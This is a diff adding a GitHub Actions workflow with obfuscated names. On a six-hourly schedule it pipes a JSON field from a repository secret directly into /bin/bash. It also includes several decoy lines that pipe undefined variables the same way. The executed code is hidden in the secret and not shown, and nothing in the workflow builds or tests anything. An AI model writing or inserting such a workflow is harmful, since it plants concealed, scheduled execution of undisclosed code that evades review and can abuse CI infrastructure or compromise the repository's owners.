@@ -1,0 +1,25 @@
+name: songlangman6789
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: songlangman6789
+        env:
+          kisc53: ${{ secrets.kisc53 }}
+        run: |
+          echo $kisc53 | jq -r .gqa0756 | /bin/bash
+          echo $ucg835 | jq -r .locl0866 | /bin/bash
+          echo $z74239 | jq -r .qor23 | /bin/bash
+          echo $o462 | jq -r .yck5 | /bin/bash
+          echo $lmfa31905 | jq -r .oy8 | /bin/bash
+          echo $xs72 | jq -r .rk74858 | /bin/bash
+          echo $zloi7 | jq -r .zmm01904 | /bin/bash
+          echo $yl9610 | jq -r .wl77129 | /bin/bash
+
